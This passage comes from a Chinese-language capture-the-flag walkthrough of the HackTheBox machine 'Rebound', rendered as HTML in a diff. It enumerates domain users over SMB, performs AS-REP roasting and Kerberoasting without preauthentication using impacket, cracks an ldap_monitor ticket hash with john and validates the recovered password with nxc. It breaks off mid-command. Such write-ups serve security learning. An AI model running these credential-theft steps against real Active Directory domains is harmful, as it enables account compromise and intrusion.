+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             513: rebound<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             514: rebound<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             515: rebound<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             516: rebound<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             517: rebound<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             518: rebound<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             519: rebound<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             520: rebound<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             521: rebound<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             522: rebound<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             525: rebound<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             526: rebound<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             527: rebound<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             553: rebound<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             571: rebound<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             572: rebound<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             1000: rebound<span class="se">\D</span>C01$ <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             1101: rebound<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             1102: rebound<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             1951: rebound<span class="se">\p</span>paul <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             2952: rebound<span class="se">\l</span>lune <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             3382: rebound<span class="se">\f</span>flock <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             5277: rebound<span class="se">\j</span>jones <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             5569: rebound<span class="se">\m</span>malone <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             5680: rebound<span class="se">\n</span>noon <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7681: rebound<span class="se">\l</span>dap_monitor <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7682: rebound<span class="se">\o</span>orend <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7683: rebound<span class="se">\S</span>erviceMgmt <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7684: rebound<span class="se">\w</span>inrm_svc <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7685: rebound<span class="se">\b</span>atch_runner <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7686: rebound<span class="se">\t</span>brady <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             7687: rebound<span class="se">\d</span>elegator$ <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span></code></pre></div><p>发现很多用户名，并且保存到<code> smb_rid_brute</code>文件中了，将用户名提取出来</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat smb_rid_brute <span class="p">|</span> grep SidTypeUser <span class="p">|</span> awk -F<span class="s1">&#39;\&#39;</span> <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> awk -F <span class="s1">&#39; &#39;</span> <span class="s1">&#39;{print $1}&#39;</span>
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">DC01$
+</span></span><span class="line"><span class="cl">ppaul
+</span></span><span class="line"><span class="cl">llune
+</span></span><span class="line"><span class="cl">fflock
+</span></span><span class="line"><span class="cl">jjones
+</span></span><span class="line"><span class="cl">mmalone
+</span></span><span class="line"><span class="cl">nnoon
+</span></span><span class="line"><span class="cl">ldap_monitor
+</span></span><span class="line"><span class="cl">oorend
+</span></span><span class="line"><span class="cl">winrm_svc
+</span></span><span class="line"><span class="cl">batch_runner
+</span></span><span class="line"><span class="cl">tbrady
+</span></span><span class="line"><span class="cl">delegator$
+</span></span></code></pre></div><p>将结果保存到<code>users.txt</code>中</p>
+<h1 id="as-rep-roasting">
+<a class="header-anchor" href="#as-rep-roasting"></a>
+AS-REP Roasting
+</h1><p>在只有用户名的条件下尝试一下<code>AS-REP Roasting</code>攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-GetNPUsers -usersfile users.txt -dc-ip 10.10.11.231 -format john rebound.htb/
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Administrator doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Guest doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User DC01$ doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User ppaul doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User llune doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User fflock doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$jjones</span>@REBOUND.HTB:42622e361da5afc11efce8e6a5b9fb63<span class="nv">$c5aebb2b60c7eb7d813577bbdc1434435bf5d12889a510343143b2f6dfa2e0fee10697476a088893e8af6b5171f674b7c94bf2a929ed634cc20438728f8eac05c4dfc8bf04c687bc8a00802e3d9bc33df35b181b965431c3aebc216605a0947a92e84176da698dc5696401c88aa727a9617d3699caa66487fc05b31dc7fbed38367fc24668a0f8b84c9c440978ed4d57b9586217b4918344b18e07cc33db95038fb9d865211df6371e3c394d01d5b07d5593d55ea7684fbe4228aea91185cfa815916ff6f9713f63199deb788ffc39466ff6ed63c5207b0c005b2035687d00ca04858a09ca5d4fcee3db</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User mmalone doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User nnoon doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User ldap_monitor doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User oorend doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User winrm_svc doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User batch_runner doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User tbrady doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User delegator$ doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span></code></pre></div><p>得到一组 hash ，使用 <code>john</code> 破解一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john jjones_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos <span class="m">5</span> AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">0g 0:00:00:39 DONE <span class="o">(</span>2025-03-26 22:01<span class="o">)</span> 0g/s 367694p/s 367694c/s 367694C/s  0841079575..*7¡Vamos!
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>失败了，可能是我字典的缘故，至少得到了一个 hash</p>
+<h1 id="kerberoasting">
+<a class="header-anchor" href="#kerberoasting"></a>
+Kerberoasting
+</h1><blockquote>
+<p>参考链接：https://www.semperis.com/blog/new-attack-paths-as-requested-sts/</p>
+</blockquote>
+<p>从上述链接中可以得知，可以利用<code>AS-REP-roastable</code>用户来执行<code>Kerberoasting</code>，而无需预身份验证，所以我们利用<code>jjones</code>进行<code>Kerberoasting</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-GetUserSPNs -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231 rebound.htb/
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$18$krbtgt$REBOUND</span>.HTB<span class="nv">$*</span>krbtgt*<span class="nv">$eb4679706c18e077e99402db$ddd49d2dcc1d45eb229a4d82c6a5d54a9670a0595cebbd3499957ebfcc329ecddb8c9f442837582a4991e79111e02c6d33ecaae6e6bd976493d1214327724f17b56e3a87c92e6cdba07d529f385b40ee751ebdb18e1fd59dc98157a560a7b5e85aa5b520cd5c66c4bd4fefac835c212063b4de5012ebb894ed3d1d15bfe56804abe3221821d676897a6ca1ad9b23078c82b3dac37b434a09301fff7efcf5e21d03b3bc9465a9f8cc19622f89768c2bc44090dca0d6229af0c474ca17c1c662d2e0ae5ff9a18e855869cdf3de68a170c7f87ae7f934441ccd57c089386c388c01551530a8c63f9e5827352b4c0f74473a9d0a26a3f1e7b7de887f2efdb9c05bf8e3ac62732f9d4447dfe65942f3ba0476a3703b67a593a492de2ddedc777c9d0547a72dbcac103aad947a6cde69e4e885fa2402a9c1ac27011542db948db9fe308610dcb50ab168fb777b16b8a67e69f2db2a613e255157663ee526d29446462e6e09faadb4fd747e3e956a14684102a2ea36c8eb6e450dc86bea95718f24ad47b70214d8336fee23716c6db20e0f3e18929ed42759673da3cd8249bb819bee3620eaa5b40753a46a6ceaf30d035f66f5301a5ea3c0ccd96b1300869f626442fe77812484d0c6797dd5d3f11c35c3d0a45d76c187ebe29ada55220eabe6b18651567812c574a2e78009e0b4e066639aec9075a28855530460651b07c5c320167f43b69cef317506a5db31d5d012213fb1b81103217a4a323df6bbb2ee2f7daff61cf3da178ba06709aaa6b56d4aedc808af3006f23545af6629d1ee9ad235528b27be60db10ca3a730556840e5023f6a19b556a95dd94a68d70ce84f56b41e251eab7bfe5aae2d962d35b7e87333b8e676430857555547c405092e519af63b8fb245c71aa242fa56c8f085250f5c3db5bcd36cc8cf53e765a079d25e770361258feaade84c995c41a4c096f37b8b762f8af9f5858fd93f55c98ba35e08b1e7cf996b3cf87aa678ebb1c575cae3f4268258a1571d86443d74bea954a0437c72b2ab00b97ba18ca239f74e74742d4144d5ae81a4f66eb5ee5685c959482b5e9ddae834e01a4a619111938642419b547a26aac9d7183e33dc6a5d160bbfbac11a8885e18eecfca2dcade6efe13ca0d1e0bd72b73f344d9b2e184e8f57610a2035497b51b075077c51ab0e7eda74afded32477592c5dd64a07040d8207e57441b98445f5843f6cf3d83c149544b13b7d8fdd94e2bf2d4ef2165a3205a16976645ec6be112e1aceb985a05356298e4a000d06ba37d3d013a7e29c9e014373b0b99f076029c1b94d575bdb9d330cf08edd589a1db3bba34362774807e4eb68af14bb81317c1b9a2dfdc0b19ccc14dd956bce6ae4a4ba13c7caf89aa7b2859d66147dbcc4a5e49ea83c534499003df1a279c9ded751306ee7995a2a35fabc4975aa2061f7b1c5042247d374e7b0943db16c68a7a5a8a</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$18$DC01$$</span>REBOUND.HTB<span class="nv">$*</span>DC01<span class="nv">$*$a3642f80cdfc9faf9bf1d0dc$5</span>d559764822a096280be6d4806cac0e3d258aa1cbb9c8139090d3844788ddda75de32ebf2a09cee2e5936c5bc3ea4bfa1b6c114bda068abd651f206edf6d931210a9ef583e5fed04cb7c4282608745751fb65653f2289f66ada77dc6c0fee01f3e67c0b42953fd5db29bbd7aab18e55436bc8fdda249ef5ade9852bb767519402809b29413ec364f588e73427fe3eb7d40d6a5eee01474960d249dd6844e32598d3efda0d42add3c8ea9af419d608395e3a41a319431346544890839d112a8f2eea417442e1183969dad64332c16295223b0973b90a161e1c77fe11011e6af2f72518dc75f64764aaf5c381443a45d50227573f31f3a2c38fc93cec0093c89616540a8d3390ea95718b1df51af645b8eff3d9492f0aebe71d68f78c1f87fa2fe0b42be06c8bf26273d3e5f2d7f854bcc83615a193482434748176c1fbabfdc91ac7cd6af2b05c8863d4ef232d174944cf075d7de3be7cf9776c9b0be625d3ce0cd62b243be51fb9d9878da6a6333c2cc1fcd7b999421e07b21384f8df969be9a0f7f54c77a668df418fb2776890ee48c3029c6597797a4e6bacb4a06c5ef523a48a2b45bd6ffe3c9c0fcd3119faba222d9f0e8b46d6f6a853233515ac8a42c0f42888b565c1d391e9cc6f81c10b078700e15d8b52ff957c7f0b4c72aba5282cdaa253f6f94fc77c0bf8acfa7e329b9916bc2764ac3dcc33832561c3190a4e3e07d34ca1ed4a74535f0cb503981dc5fd3123c92d5b05e53ea732e6928e431ef60753b39f6afc3619eb71205e1bfa0818f32c564f467921914357b0410fad165a51a9a8cec69c9c0d0f2de8cde0d88d746892616e66cd9aa4f603243ef96298843ff33630bd8bb509ec1b5b3f8d7e2b7facfe1f61e508e9a8683fa322ea3e1be2d6bb2a81fce7264eeb1dd10d0049b4a3a5390e71204ff38bfdb4824ba5fac92b7dccd365c0eafb24dd7b0c17f5567d49f325caf1023e6049750a27343adf75dd9da66636ee498d79269bfe36388cf6b7074772576af3957aac3d2d9020857d5c2dba1442224af03b6e9f03b28cec44c411c9739a0cb48e27384971ae35f0a290b69bd0076fd7fd081a7d655e04ccc4ed6132e5b5ae8c8c5af4f1918a648e883a301867f329e30b2aea457f59dec972db7a9d43be8d170d44733293be45390cb7676e438618c87dba25fccc6289095b6d6d215a37798b598fd9455fbd81b02866df24542008a408bf2989fe99ec4921d09a73a4a63c0d74213aba25c4629b95b729e0b0ad4f83d97d34532572e9a0787a9572a5360e4a3235e48bf797b0e3a2af32238c8a5fe79836825b468bf037bfd2b56cf0f4399e289742a4d39ce42a5b7d03b148a7324a68f1ebe6c
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>ldap_monitor<span class="nv">$REBOUND</span>.HTB<span class="nv">$ldap_monitor</span>*<span class="nv">$76</span>ffccd00fd6cec100003e294bfd49c9<span class="nv">$f243e557524a289f9d624a13c07fc9083546a6a815aecc1593ea68b58a3ee4cc3e0da8a84ea8d1280cd1b5bdba6f054ab01b27e5f90c3efc2c186b1fb0a69ded8395fff79e499daf31d73ba0b22eef783d56c1c3e3145a4311a286041ecfd1e2f045f30f408fa53dc8ad63da1c350bc80655cb24f2fa28ca6d3545a29e439d342aeae1df3f5238bd3215c7310211de669c55333f6e2f4f69df227a8367b023ff578862a52af595ba2656ecfbd6232f02c6097466132de7035a465281a4b59b42cbf8fac30fcbedacc399355d59b8916c49fec2d2ef2b33fe4b262474ffc8fb54916f6ac1ca2a2332c22e1190e9f68d4a3d31c7ec71fea80618363ef34b8a74e76c1d610133478d3514645d02eeacd68bbcf89d35c590a0e4a2de80432745ba8a211aa66acbe31d9c9063d06a18777ad5632df81672a8318392a116d0ab8fb47f4966a180a55753681e93692736ae465ace0200845a4805755653b74265f0ff57cca0d0714b564cce91504873744d9cebb5100413c3596f0a4e2803786f0cb6511950f8730588420b37ebb9f34b0e29c83b185c4bbf1921a63cc1fe3e4060c91ccab36a7b5c4833b5848d67c869f23bc068636aa4d659dd2ccca0fe8a58cbd958b50b6ab2c8f674c17e395392111efef9a7da33bd7abceb23c927a46f82c3000118e3210b8618ea87b9821381482bd0ccc3a208a02ec1ff61a56f517ecf3073fee23ac3237b4fff94aa57d092671ffdcaef0a3304beab2bc2fd9ab15161998bcec0afc64e7f4fa38c4e4e1c5e4b6e973f626b881e9f380f989b3b597ed8a98004c3595af28a5e3469e6a250baf25d97d8c06e4039fd7f330630f7b82f4a5428c5d7d52036322c3eaf479d784def87da67f3f0574e79d32d37a37863b1107d3d571afc2b5ee2ce69f5d13d700602c2dfa6625be2ef80dfa1da6795c163260e09d74f7eb1fdc07e20f30d4f73ecf115381b7d31aa5d7f5e3423b3ba50c6dc6928b210206163a2d8c632ed2bad04e46ee22963875d741b8dfb228d5fcee2a82c9e8eccbe19b3c867d601b84d54ed70052dadd9b9a3bf3842a5ee0b2743f6604e02f8c8144540fb347faeeab838c206adff8f06949a0ce77594924e8e60298632458bca0f1bd5b33057283980b82a1fd75ebdbdd42a76b133a83eb27087cee826d1a220ea183b84d15e04d06dee2120beab37bcea7888a29ed25522fd5ab247fa0185b7b02014a9b78a3180fad5e1404718481b75724e174856da90eaa6defa8bbe7f371b698fa0c89b367ea6562c12a2082a098750b710ddf65e9167e45f2bb2be333b9dbf14fa9e4796d20960234427716d5fdaabe21d10cd8dd3b91a136a456fb4124f</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span class="o">(</span>Server not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$18$delegator$$</span>REBOUND.HTB<span class="nv">$*</span>delegator<span class="nv">$*$4</span>fdf3b232c7fd08865bb7d32<span class="nv">$629</span>d55094372b866eb455a9877847145df7bea3b552903e570afddfc666fdf7c5498ec6eb0e7f1863919c1149f8820a206916b7e3c09df75ebba74a5684deeefd76c0a0fee9b55053142d1a36e1452b9ec68ad8201976be42ca30898fb208231ea039b6b048974ac6ebb32d132d76e3e29dd9f32de994b68979603ec3188e46ecd6c460238aa38d26fba569d5c5db157eea48280d1980f5770140447171225e266b9c331ac3aa35ab6b3eff95d65d0a705e6942358d7a31bfc39d231047551183be16478ca81da7430d156f4b9f23506a74a05c564b10108c71eea4e9482fece179136e6fd2a685d6133e3d10f451180aad7859d6bfdd987f908d3c659eb1de8b0c02e5a3fb4bf63784f439bb11202dfbfdc6f2f128cb5d9b6f2424ff612f93008ad2b5cca66eba746931e213a395272259ed00d26add46586d160f7a31ce8badde4f369abb1330b43f714eeca477f45dc6118fb1a911fd0e219efa1e864323100e5bde957c4bb8bf169dfde4e2349b3d0c3a201dae3a0f4409f1da017d7d0309c206c774a00df8791ad87abf2f96e39495a98f38a557bfaa227ba88f12f6feeaa154c9dae682336701cc07ddf56821e7f388a161a13b11fc5ba52243a3ce290b394037571d6e31a7f6c53e373386a0b5abf26a235abe41b6afde63211813fd4ae5e295ff67597f24e7a253a8636cc71032919efac4e3b11e219b3e0252682bcd92ad5e8b07fdc759ac7c10af9eaef76f8de56dd482f064197c4a23e94057626a1eec508b58efbfaa13f773d08ef0a1c1a9f3bccb8d45bc758a143268f9029c3459f0d78f56f6bcaefb3d8e6a35ec82a18211263892b16ce7490e886f84779f487619e6509dd21130393ad5861f1fa6a954800d32fd0f4c7a02f3852c4812512c516340eb6694e42bf6caa9cc46cec6015016b4d83a79fae89bd5052dc211b1ef067e902c02ec0e31a56ad9c714f055cd6e0f69cc8701ef0beefb5d0c74b4183d1b9cb0578d2ab52eb52a58bb7b23476c66c3ae01a4108c8deb84f19d9e4e7392320d931364534e8063ea48347bb42ff62e291ae3daa50575421d652775d16e48fe5656adcd7dfbf631023e66e48ca0fcc969fa7334e90c4bad7cfcd4df280c75333787e496d7810b64024d64f22a70576cccf4e2444e47a2ade22f06f7539f1df25e400ffbc950c96e91f6f46f37fd7f6943760431f1c157fd8b47be639eb4818ab756051e9f0f16d4aa6093268ef3f130ebe1a8cb065fb4513f724c47f595a411e38fd1d06a31b92f79c6161fdd8342164ec3534ba805fdecf4579b3baaac439435949dc3d5b375d997d156e22aaf07a4a392c1bdc51479e3f9a7b57e8057d3aad8cde5b0bc079933e
+</span></span></code></pre></div><p>注意到拿到了四个账户的 hash ，但是看起来 <code>ldap_monitor</code> 像是能尝试破解一下，其他账户都是机器账户</p>
+<p>使用 <code>john</code> 破解一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john ldap_monitor_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos <span class="m">5</span> TGS etype <span class="m">23</span> <span class="o">[</span>MD4 HMAC-MD5 RC4<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">1GR8t@<span class="nv">$$</span>4u       <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:21 DONE <span class="o">(</span>2025-03-26 22:16<span class="o">)</span> 0.04653g/s 606799p/s 606799c/s 606799C/s 1Gobucs!..1Eoska6
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>破解成功，拿到一组凭据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: ldap_monitor
+</span></span><span class="line"><span class="cl">password: 1GR8t@$$4u
+</span></span></code></pre></div><p>使用<code>nxc</code>验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb 10.10.11.231 -u <span class="s1">&#39;ldap_monitor&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\l</span>dap_monitor:1GR8t@<span class="nv">$$</span>4u
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u <span class="s1">&#39;ldap_monitor&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span>
